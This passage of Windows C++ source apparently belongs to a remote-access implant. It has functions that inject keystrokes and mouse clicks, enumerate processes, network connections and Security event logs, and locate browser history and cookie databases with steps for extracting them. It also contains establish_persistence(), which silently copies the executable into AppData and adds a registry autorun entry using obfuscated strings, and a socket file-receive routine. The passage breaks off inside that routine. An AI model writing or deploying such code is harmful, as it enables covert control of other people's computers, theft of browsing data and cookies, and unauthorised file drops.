    // Wait for window to become active
    Sleep(500);

    // Get window position
    RECT rect;
    GetWindowRect(hwnd, &rect);

    // Calculate absolute position
    int absX = rect.left + x;
    int absY = rect.top + y;

    // Move cursor and click
    SetCursorPos(absX, absY);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    Sleep(50);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

    return "Clicked at position (" + std::to_string(x) + ", " + std::to_string(y) + ") in " + processName;
}

// Function to list and launch applications from Start Menu
std::string launch_from_start_menu(const std::string &appName)
{
    std::vector<std::string> startMenuPaths = {
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\",
        // Add user's start menu path
    };

    // Add user's start menu path
    char userProfilePath[MAX_PATH];
    if (ExpandEnvironmentStringsA("%USERPROFILE%", userProfilePath, MAX_PATH) > 0)
    {
        startMenuPaths.push_back(std::string(userProfilePath) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\");
    }

    // Search for the application in start menu paths
    std::string foundPath;
    bool found = false;

    for (const auto &basePath : startMenuPaths)
    {
        WIN32_FIND_DATAA findData;
        std::string searchPath = basePath + "*.lnk";

        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                std::string filename = findData.cFileName;
                std::string lowerFilename = filename;
                std::string lowerAppName = appName;

                // Convert to lowercase for case-insensitive comparison
                std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);
                std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

                // Check if the filename contains the app name
                if (lowerFilename.find(lowerAppName) != std::string::npos)
                {
                    foundPath = basePath + filename;
                    found = true;
                    break;
                }

            } while (FindNextFileA(hFind, &findData));

            FindClose(hFind);
            if (found)
                break;
        }

        // Also search in subdirectories
        searchPath = basePath + "*";
        hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    std::string dirname = findData.cFileName;
                    if (dirname != "." && dirname != "..")
                    {
                        std::string subdir = basePath + dirname + "\\";

                        WIN32_FIND_DATAA subFindData;
                        std::string subSearchPath = subdir + "*.lnk";

                        HANDLE hSubFind = FindFirstFileA(subSearchPath.c_str(), &subFindData);
                        if (hSubFind != INVALID_HANDLE_VALUE)
                        {
                            do
                            {
                                std::string filename = subFindData.cFileName;
                                std::string lowerFilename = filename;
                                std::string lowerAppName = appName;

                                // Convert to lowercase for case-insensitive comparison
                                std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);
                                std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

                                // Check if the filename contains the app name
                                if (lowerFilename.find(lowerAppName) != std::string::npos)
                                {
                                    foundPath = subdir + filename;
                                    found = true;
                                    break;
                                }

                            } while (FindNextFileA(hSubFind, &subFindData));

                            FindClose(hSubFind);
                            if (found)
                                break;
                        }
                    }
                }

            } while (FindNextFileA(hFind, &findData));

            FindClose(hFind);
            if (found)
                break;
        }
    }

    if (!found)
    {
        return "Application not found in Start Menu: " + appName;
    }

    // Get initial PIDs before launching
    std::vector<DWORD> initialPids;
    DWORD processes[1024], bytesReturned;
    if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
    {
        DWORD processCount = bytesReturned / sizeof(DWORD);
        for (DWORD i = 0; i < processCount; i++)
        {
            if (processes[i] != 0)
            {
                initialPids.push_back(processes[i]);
            }
        }
    }

    // Launch the application using ShellExecute
    HINSTANCE result = ShellExecuteA(NULL, "open", foundPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if ((intptr_t)result > 32)
    {
        // Wait for the process to start
        Sleep(1000); // Wait a bit longer for the process to start

        // Get the actual process name from the shortcut
        std::string processName = "";

        // Extract process name from shortcut path
        size_t lastSlash = foundPath.find_last_of("\\/");
        if (lastSlash != std::string::npos)
        {
            std::string shortcutName = foundPath.substr(lastSlash + 1);
            // Remove .lnk extension
            size_t dotPos = shortcutName.find_last_of(".");
            if (dotPos != std::string::npos)
            {
                processName = shortcutName.substr(0, dotPos);
            }
        }

        // Find new processes that weren't running before
        DWORD newPid = 0;
        if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
        {
            DWORD processCount = bytesReturned / sizeof(DWORD);
            for (DWORD i = 0; i < processCount; i++)
            {
                if (processes[i] != 0)
                {
                    // Check if this is a new process
                    bool isNewProcess = true;
                    for (DWORD oldPid : initialPids)
                    {
                        if (processes[i] == oldPid)
                        {
                            isNewProcess = false;
                            break;
                        }
                    }

                    if (isNewProcess)
                    {
                        // Get process name to check if it matches what we're looking for
                        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
                        if (hProcess)
                        {
                            char exePath[MAX_PATH];
                            if (GetModuleFileNameExA(hProcess, NULL, exePath, MAX_PATH) > 0)
                            {
                                std::string exeName = exePath;
                                size_t lastBackslash = exeName.find_last_of("\\/");
                                if (lastBackslash != std::string::npos)
                                {
                                    exeName = exeName.substr(lastBackslash + 1);
                                }

                                // Remove extension
                                size_t lastDot = exeName.find_last_of(".");
                                if (lastDot != std::string::npos)
                                {
                                    exeName = exeName.substr(0, lastDot);
                                }

                                // Convert to lowercase for case-insensitive comparison
                                std::string lowerExeName = exeName;
                                std::transform(lowerExeName.begin(), lowerExeName.end(), lowerExeName.begin(), ::tolower);

                                std::string lowerProcessName = processName;
                                std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

                                // Also check against the original app name
                                std::string lowerAppName = appName;
                                std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

                                if (lowerExeName.find(lowerProcessName) != std::string::npos ||
                                    lowerExeName.find(lowerAppName) != std::string::npos)
                                {
                                    newPid = processes[i];
                                    CloseHandle(hProcess);
                                    break;
                                }
                            }
                            CloseHandle(hProcess);
                        }
                    }
                }
            }
        }

        if (newPid != 0)
        {
            return "Successfully launched application from Start Menu: " + foundPath + " (Actual PID: " + std::to_string(newPid) + ")";
        }

        // If we couldn't find the PID by name, try to get it by window title
        Sleep(500); // Wait a bit more for windows to appear
        HWND hwndTemp = FindWindowA(NULL, NULL);
        while (hwndTemp != NULL)
        {
            char windowTitle[256];
            GetWindowTextA(hwndTemp, windowTitle, sizeof(windowTitle));

            // If window title contains app name, it's likely our app
            std::string title = windowTitle;
            std::string lowerTitle = title;
            std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::tolower);

            std::string lowerAppName = appName;
            std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

            if (!title.empty() && (lowerTitle.find(lowerAppName) != std::string::npos))
            {
                DWORD windowPid;
                GetWindowThreadProcessId(hwndTemp, &windowPid);
                if (windowPid != 0)
                {
                    return "Successfully launched application from Start Menu: " + foundPath + " (Actual PID: " + std::to_string(windowPid) + ")";
                }
            }

            hwndTemp = GetWindow(hwndTemp, GW_HWNDNEXT);
        }

        return "Successfully launched application from Start Menu: " + foundPath + " (PID unknown - could not determine actual process)";
    }

    // If ShellExecute fails, try system command
    std::string sysCmd = "start \"\" \"" + foundPath + "\"";
    int sysResult = system(sysCmd.c_str());
    if (sysResult == 0)
    {
        return "Successfully launched application using system command: " + foundPath + " (PID unknown - system() call)";
    }

    return "Failed to launch application: " + foundPath + " (Error: " + std::to_string(GetLastError()) + ")";
}

std::string send_keystrokes_at_cursor(const std::string &keys)
{
    // No need to find or activate a window - just send keystrokes to current focus

    // Use SendInput for reliable input
    std::vector<INPUT> inputs;

    size_t i = 0;
    while (i < keys.length())
    {
        // Check for special key sequences in curly braces
        if (keys[i] == '{')
        {
            size_t endBrace = keys.find('}', i);
            if (endBrace != std::string::npos)
            {
                std::string specialKey = keys.substr(i, endBrace - i + 1);
                processSpecialKey(specialKey, inputs);
                i = endBrace + 1;
                continue;
            }
        }

        // Regular character processing
        char c = keys[i];
        SHORT vk = VkKeyScanA(c);
        BYTE vkCode = LOBYTE(vk);
        BYTE shiftState = HIBYTE(vk);

        // Add shift key down if needed
        if (shiftState & 1)
        {
            INPUT shiftDown = {0};
            shiftDown.type = INPUT_KEYBOARD;
            shiftDown.ki.wVk = VK_SHIFT;
            inputs.push_back(shiftDown);
        }

        // Key down
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = vkCode;
        inputs.push_back(keyDown);

        // Key up
        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = vkCode;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);

        // Add shift key up if needed
        if (shiftState & 1)
        {
            INPUT shiftUp = {0};
            shiftUp.type = INPUT_KEYBOARD;
            shiftUp.ki.wVk = VK_SHIFT;
            shiftUp.ki.dwFlags = KEYEVENTF_KEYUP;
            inputs.push_back(shiftUp);
        }

        i++;
    }

    // Send all inputs
    if (!inputs.empty())
    {
        SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
    }

    // Get info about the current foreground window for reporting
    HWND currentForeground = GetForegroundWindow();
    DWORD pid = 0;
    GetWindowThreadProcessId(currentForeground, &pid);

    char windowTitle[256] = {0};
    GetWindowTextA(currentForeground, windowTitle, sizeof(windowTitle));

    std::string windowInfo = windowTitle[0] ? std::string(" (Current window: ") + windowTitle + ")" : "";
    return "Keystrokes sent to current focus" + windowInfo;
}

// Helper function to handle special key sequences
void processSpecialKey(const std::string &key, std::vector<INPUT> &inputs)
{
    if (key == "{ENTER}" || key == "{RETURN}")
    {
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = VK_RETURN;
        inputs.push_back(keyDown);

        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = VK_RETURN;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);
    }
    else if (key == "{TAB}")
    {
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = VK_TAB;
        inputs.push_back(keyDown);

        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = VK_TAB;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);
    }
    else if (key == "{SPACE}")
    {
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = VK_SPACE;
        inputs.push_back(keyDown);

        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = VK_SPACE;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);
    }
    // Add more special keys as needed
}

// Function to open YouTube links without ads
std::string open_youtube_without_ads(const std::string &url)
{
    // Check if the URL is a YouTube link
    if (url.find("youtube.com") == std::string::npos && url.find("youtu.be") == std::string::npos)
    {
        return "Not a YouTube URL: " + url;
    }

    // Try to find Chrome or Edge browser
    std::vector<std::string> browserPaths = {
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"};

    std::string browserPath;
    for (const auto &path : browserPaths)
    {
        if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES)
        {
            browserPath = path;
            break;
        }
    }

    if (browserPath.empty())
    {
        // If specific browsers not found, use default browser
        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
        return "Opened URL with default browser (ad blocking not guaranteed): " + url;
    }

    // Construct command line with ad-blocking parameters
    // For Chrome/Edge, we'll use the "--incognito" flag which might help with some ads
    // In a real implementation, you might want to use specific extensions or parameters
    std::string commandLine = "\"" + browserPath + "\" --incognito " + url;

    // Create process to launch browser
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    if (CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "Opened YouTube URL in incognito mode (may reduce ads): " + url;
    }
    else
    {
        return "Failed to launch browser: " + std::to_string(GetLastError());
    }
}

// Function to search for a specific process
std::string search_process(const std::string &process_name)
{
    std::stringstream result;
    int count = 0;

    // Convert search term to lowercase for case-insensitive comparison
    std::string search_term = process_name;
    std::transform(search_term.begin(), search_term.end(), search_term.begin(), ::tolower);

    result << "Searching for processes matching: " << process_name << "\n\n";
    result << "PID\tProcess Name\n";
    result << "---\t------------\n";

    // Create a snapshot of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return "Error: Failed to create process snapshot";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hSnapshot, &pe32))
    {
        CloseHandle(hSnapshot);
        return "Error: Failed to get process information";
    }

    // Iterate through all processes
    do
    {
        std::string current_process;

#ifdef UNICODE
        // Convert wide string to narrow string
        char narrow_name[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
        current_process = std::string(narrow_name);
#else
        // In ANSI mode, just use the string directly
        current_process = std::string(pe32.szExeFile);
#endif

        // Convert to lowercase for comparison
        std::string current_process_lower = current_process;
        std::transform(current_process_lower.begin(), current_process_lower.end(),
                       current_process_lower.begin(), ::tolower);

        // Check if the process name contains the search term
        if (current_process_lower.find(search_term) != std::string::npos)
        {
            result << pe32.th32ProcessID << "\t" << current_process << "\n";
            count++;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    result << "\nFound " << count << " matching process(es)";
    return result.str();
}

// Add this new function to get network information
std::string get_network_info()
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    std::string info = "=== NETWORK INFORMATION ===\n\n";

    // Get hostname
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    info += "Hostname: " + std::string(hostname) + "\n";

    // Get adapter information
    IP_ADAPTER_INFO *pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG bufLen = sizeof(IP_ADAPTER_INFO);

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(bufLen);
    }

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR)
    {
        IP_ADAPTER_INFO *pAdapter = pAdapterInfo;
        int adapterCount = 0;

        while (pAdapter)
        {
            adapterCount++;
            info += "\n=== ADAPTER " + std::to_string(adapterCount) + " ===\n";
            info += "Description: " + std::string(pAdapter->Description) + "\n";
            info += "Adapter Name: " + std::string(pAdapter->AdapterName) + "\n";
            info += "MAC Address: ";

            for (UINT i = 0; i < pAdapter->AddressLength; i++)
            {
                char temp[3];
                sprintf(temp, "%02X", pAdapter->Address[i]);
                info += std::string(temp);
                if (i < pAdapter->AddressLength - 1)
                {
                    info += "-";
                }
            }
            info += "\n";

            info += "IP Address: " + std::string(pAdapter->IpAddressList.IpAddress.String) + "\n";
            info += "Subnet Mask: " + std::string(pAdapter->IpAddressList.IpMask.String) + "\n";
            info += "Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String) + "\n";

            // DHCP information
            if (pAdapter->DhcpEnabled)
            {
                info += "DHCP Enabled: Yes\n";
                info += "DHCP Server: " + std::string(pAdapter->DhcpServer.IpAddress.String) + "\n";
                info += "Lease Obtained: " + std::to_string(pAdapter->LeaseObtained) + "\n";
            }
            else
            {
                info += "DHCP Enabled: No\n";
            }

            pAdapter = pAdapter->Next;
        }
    }

    free(pAdapterInfo);

    // Get active connections
    info += "\n=== ACTIVE CONNECTIONS ===\n";

    MIB_TCPTABLE_OWNER_PID *pTcpTable = NULL;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    // Make an initial call to GetTcpTable to get the necessary size
    dwRetVal = GetExtendedTcpTable(NULL, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER)
    {
        pTcpTable = (MIB_TCPTABLE_OWNER_PID *)malloc(dwSize);
        if (pTcpTable != NULL)
        {
            dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
            if (dwRetVal == NO_ERROR)
            {
                info += "TCP Connections: " + std::to_string(pTcpTable->dwNumEntries) + "\n\n";

                for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++)
                {
                    // Convert IP addresses to strings
                    struct in_addr localAddr, remoteAddr;
                    localAddr.s_addr = pTcpTable->table[i].dwLocalAddr;
                    remoteAddr.s_addr = pTcpTable->table[i].dwRemoteAddr;

                    char localAddrStr[INET_ADDRSTRLEN];
                    char remoteAddrStr[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &localAddr, localAddrStr, sizeof(localAddrStr));
                    inet_ntop(AF_INET, &remoteAddr, remoteAddrStr, sizeof(remoteAddrStr));

                    // Convert ports from network byte order
                    DWORD localPort = ntohs((u_short)pTcpTable->table[i].dwLocalPort);
                    DWORD remotePort = ntohs((u_short)pTcpTable->table[i].dwRemotePort);

                    // Get state
                    std::string state;
                    switch (pTcpTable->table[i].dwState)
                    {
                    case MIB_TCP_STATE_CLOSED:
                        state = "CLOSED";
                        break;
                    case MIB_TCP_STATE_LISTEN:
                        state = "LISTENING";
                        break;
                    case MIB_TCP_STATE_SYN_SENT:
                        state = "SYN_SENT";
                        break;
                    case MIB_TCP_STATE_SYN_RCVD:
                        state = "SYN_RECEIVED";
                        break;
                    case MIB_TCP_STATE_ESTAB:
                        state = "ESTABLISHED";
                        break;
                    case MIB_TCP_STATE_FIN_WAIT1:
                        state = "FIN_WAIT1";
                        break;
                    case MIB_TCP_STATE_FIN_WAIT2:
                        state = "FIN_WAIT2";
                        break;
                    case MIB_TCP_STATE_CLOSE_WAIT:
                        state = "CLOSE_WAIT";
                        break;
                    case MIB_TCP_STATE_CLOSING:
                        state = "CLOSING";
                        break;
                    case MIB_TCP_STATE_LAST_ACK:
                        state = "LAST_ACK";
                        break;
                    case MIB_TCP_STATE_TIME_WAIT:
                        state = "TIME_WAIT";
                        break;
                    case MIB_TCP_STATE_DELETE_TCB:
                        state = "DELETE_TCB";
                        break;
                    default:
                        state = "UNKNOWN";
                        break;
                    }

                    info += "Connection " + std::to_string(i + 1) + ":\n";
                    info += "  Local: " + std::string(localAddrStr) + ":" + std::to_string(localPort) + "\n";
                    info += "  Remote: " + std::string(remoteAddrStr) + ":" + std::to_string(remotePort) + "\n";
                    info += "  State: " + state + "\n";
                    info += "  PID: " + std::to_string(pTcpTable->table[i].dwOwningPid) + "\n\n";
                }
            }
            free(pTcpTable);
        }
    }

    WSACleanup();
    info += "##END_OF_NETWORK_INFO##";
    return info;
}

// Add this new function to get system logs
std::string get_system_logs(const char *log_type = "System", int num_entries = 50)
{
    std::string result = "=== SYSTEM LOGS ===\n\n";

    // Convert log_type to wstring
    std::wstring wLogType;
    if (strcmp(log_type, "System") == 0)
        wLogType = L"System";
    else if (strcmp(log_type, "Application") == 0)
        wLogType = L"Application";
    else if (strcmp(log_type, "Security") == 0)
        wLogType = L"Security";
    else
        wLogType = L"System"; // Default to System logs

    HANDLE hEventLog = OpenEventLogW(NULL, wLogType.c_str());
    if (!hEventLog)
    {
        return result + "Failed to open event log.\n";
    }

    DWORD dwReadFlags = EVENTLOG_BACKWARDS_READ | EVENTLOG_SEQUENTIAL_READ;
    DWORD dwRecordOffset = 0;
    DWORD dwBytesRead = 0;
    DWORD dwBytesNeeded = 0;

    // Get the size needed for the buffer
    if (!GetOldestEventLogRecord(hEventLog, &dwRecordOffset))
    {
        CloseEventLog(hEventLog);
        return result + "Failed to get oldest event log record.\n";
    }

    // Allocate a buffer for the event records
    DWORD dwBufferSize = 65536; // 64KB buffer
    BYTE *pBuffer = new BYTE[dwBufferSize];
    if (!pBuffer)
    {
        CloseEventLog(hEventLog);
        return result + "Failed to allocate memory for event log buffer.\n";
    }

    // Add log type to result
    result += "Log Type: " + std::string(log_type) + "\n\n";

    int count = 0;
    BOOL bStatus = TRUE;

    // Read event log entries
    while (count < num_entries && (bStatus = ReadEventLogW(
                                       hEventLog,
                                       dwReadFlags,
                                       0,
                                       pBuffer,
                                       dwBufferSize,
                                       &dwBytesRead,
                                       &dwBytesNeeded)))
    {
        DWORD dwRecordCount = dwBytesRead / sizeof(EVENTLOGRECORD);
        EVENTLOGRECORD *pRecord = (EVENTLOGRECORD *)pBuffer;

        for (DWORD i = 0; i < dwRecordCount && count < num_entries; i++)
        {
            // Get the timestamp
            SYSTEMTIME st;
            FileTimeToSystemTime((FILETIME *)&pRecord->TimeGenerated, &st);

            char timeStr[30];
            sprintf_s(timeStr, sizeof(timeStr), "%04d-%02d-%02d %02d:%02d:%02d",
                      st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

            // Get event type as string
            std::string eventType;
            switch (pRecord->EventType)
            {
            case EVENTLOG_ERROR_TYPE:
                eventType = "ERROR";
                break;
            case EVENTLOG_WARNING_TYPE:
                eventType = "WARNING";
                break;
            case EVENTLOG_INFORMATION_TYPE:
                eventType = "INFORMATION";
                break;
            case EVENTLOG_AUDIT_SUCCESS:
                eventType = "AUDIT_SUCCESS";
                break;
            case EVENTLOG_AUDIT_FAILURE:
                eventType = "AUDIT_FAILURE";
                break;
            default:
                eventType = "UNKNOWN";
            }

            // Get source name
            LPWSTR sourceName = (LPWSTR)((BYTE *)pRecord + sizeof(EVENTLOGRECORD));

            // Convert source name to string
            char sourceNameStr[256] = {0};
            WideCharToMultiByte(CP_ACP, 0, sourceName, -1, sourceNameStr, sizeof(sourceNameStr), NULL, NULL);

            // Get event ID (without facility)
            DWORD eventID = pRecord->EventID & 0xFFFF;

            // Format the log entry
            char logEntry[512];
            sprintf_s(logEntry, sizeof(logEntry), "[%s] | %s | %s | EventID: %lu\n",
                      timeStr, eventType.c_str(), sourceNameStr, eventID);

            result += logEntry;
            count++;

            // Move to the next record
            pRecord = (EVENTLOGRECORD *)((BYTE *)pRecord + pRecord->Length);
        }
    }

    // Check if we failed because the buffer was too small
    if (!bStatus && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        result += "\nWarning: Some log entries may have been skipped due to buffer size limitations.\n";
    }

    // Clean up
    delete[] pBuffer;
    CloseEventLog(hEventLog);

    return result;
}

// Function to extract browser history and cookies
std::string get_browser_data()
{
    std::string result = "=== BROWSER DATA ===\n\n";

    // Define paths to browser data for common browsers
    struct BrowserInfo
    {
        std::string name;
        std::string historyPath;
        std::string cookiesPath;
    };

    std::vector<BrowserInfo> browsers;

    // Get user profile path
    char userProfilePath[MAX_PATH];
    if (!ExpandEnvironmentStringsA("%USERPROFILE%", userProfilePath, MAX_PATH))
    {
        return result + "Failed to get user profile path.\n";
    }

    std::string profilePath = userProfilePath;

    // Chrome
    browsers.push_back({"Google Chrome",
                        profilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                        profilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"});

    // Firefox
    browsers.push_back({"Mozilla Firefox",
                        profilePath + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                        profilePath + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"});

    // Edge
    browsers.push_back({"Microsoft Edge",
                        profilePath + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
                        profilePath + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"});

    // Opera
    browsers.push_back({"Opera",
                        profilePath + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\History",
                        profilePath + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"});

    // For each browser, try to extract data
    for (const auto &browser : browsers)
    {
        result += "Browser: " + browser.name + "\n";

        // Check if browser is installed by looking for history file
        bool browserFound = false;

        // For Firefox, we need to find the profile directory first
        if (browser.name == "Mozilla Firefox")
        {
            WIN32_FIND_DATAA findData;
            std::string searchPath = browser.historyPath + "\\*";
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

            if (hFind != INVALID_HANDLE_VALUE)
            {
                do
                {
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                    {
                        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0)
                        {
                            // Found a profile directory
                            std::string profileDir = browser.historyPath + "\\" + findData.cFileName;
                            std::string placesFile = profileDir + "\\places.sqlite";

                            if (GetFileAttributesA(placesFile.c_str()) != INVALID_FILE_ATTRIBUTES)
                            {
                                result += "  Profile: " + std::string(findData.cFileName) + "\n";
                                result += "  History database: " + placesFile + "\n";
                                browserFound = true;
                            }
                        }
                    }
                } while (FindNextFileA(hFind, &findData));

                FindClose(hFind);
            }
        }
        else
        {
            // For other browsers, just check if the history file exists
            if (GetFileAttributesA(browser.historyPath.c_str()) != INVALID_FILE_ATTRIBUTES)
            {
                result += "  History database: " + browser.historyPath + "\n";
                browserFound = true;
            }

            if (GetFileAttributesA(browser.cookiesPath.c_str()) != INVALID_FILE_ATTRIBUTES)
            {
                result += "  Cookies database: " + browser.cookiesPath + "\n";
                browserFound = true;
            }
        }

        if (!browserFound)
        {
            result += "  Not installed or no data found.\n";
        }

        result += "\n";
    }

    // Note: Actual extraction of history/cookies from SQLite databases would require
    // including SQLite library and implementing SQL queries, which is beyond the
    // scope of this simple implementation.
    result += "Note: To extract actual history and cookies data, you would need to:\n";
    result += "1. Copy these database files to a temporary location\n";
    result += "2. Use SQLite to query the data\n";
    result += "3. For Chrome/Edge/Opera: History table 'urls' contains browsing history\n";
    result += "4. For Firefox: places.sqlite contains history in 'moz_places' table\n";

    return result;
}

// Function to establish persistence
void establish_persistence()
{
    // Get AppData path
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) != S_OK)
    {
        return; // Silently fail if we can't get AppData path
    }

    // Use simple filename
    std::string filename = encrypted_strings::get_appdata_filename();
    std::string targetLocation = std::string(appDataPath) + "\\" + filename;

    // Get current executable path
    char currentExePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, currentExePath, MAX_PATH) == 0)
    {
        return; // Silently fail if we can't get current exe path
    }

    // Check if file already exists at target location
    if (GetFileAttributesA(targetLocation.c_str()) == INVALID_FILE_ATTRIBUTES)
    {
        // File doesn't exist, try to copy it
        CopyFileA(currentExePath, targetLocation.c_str(), FALSE);
        // Continue regardless of success/failure
    }

    // Always try to add registry entry for persistence
    HKEY hKey;
    std::string regKey = encrypted_strings::get_registry_key();
    std::string regValue = encrypted_strings::get_registry_value();
    
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
                               regKey.c_str(), 
                               0, KEY_SET_VALUE, &hKey);
    
    if (result == ERROR_SUCCESS)
    {
        // Set the registry value
        RegSetValueExA(hKey, regValue.c_str(), 0, REG_SZ, 
                      (const BYTE*)targetLocation.c_str(), 
                      targetLocation.length() + 1);
        RegCloseKey(hKey);
    }
}

// File transfer functions
bool receive_file(SOCKET sock, const std::string& destination_path)
{
    try
    {
        // First receive the file size (8 bytes)
        char size_buffer[8];
        int bytes_received = recv(sock, size_buffer, 8, 0);
        if (bytes_received != 8)
        {
            std::cout << "Failed to receive file size" << std::endl;
            return false;
        }
        
        // Convert from big-endian to host byte order
        uint64_t file_size_be = 0;
        memcpy(&file_size_be, size_buffer, 8);
        uint64_t file_size = _byteswap_uint64(file_size_be);
        
        // Create the destination directory if it doesn't exist
        std::string directory = destination_path.substr(0, destination_path.find_last_of("\\/"));
        if (!directory.empty() && directory.length() > 3) // Skip drive letters like "C:\"
        {
            // Create directory recursively, but skip the drive letter part
            std::string current_path;
            bool skip_drive = false;
            
            for (size_t i = 0; i < directory.length(); i++)
            {
                char c = directory[i];
                current_path += c;
                
                // Skip creating directory for drive letters (e.g., "C:\")
                if (i == 2 && current_path.length() == 3 && current_path[1] == ':' && current_path[2] == '\\')
                {
                    skip_drive = true;
                    continue;
                }
                
                if ((c == '\\' || c == '/' || i == directory.length() - 1) && !skip_drive)
                {
                    if (!CreateDirectoryA(current_path.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
                    {
                        std::cout << "DEBUG: Failed to create directory: " << current_path << std::endl;
                        // Don't return false, just continue - the file might still be writable
                    }
                }
                
                if (skip_drive && (c == '\\' || c == '/'))
                {
                    skip_drive = false; // Reset after passing the drive letter
                }
            }
        }
        
        // Debug: Show what we're trying to create
        std::cout << "DEBUG: Creating file: " << destination_path << std::endl;
        std::cout << "DEBUG: File size to receive: " << file_size << " bytes" << std::endl;
        
        // Open the destination file
        std::ofstream file(destination_path, std::ios::binary);
        if (!file.is_open())
        {
            std::cout << "DEBUG: Failed to open destination file: " << destination_path << std::endl;
            std::cout << "DEBUG: Error code: " << GetLastError() << std::endl;
            return false;
        }
        
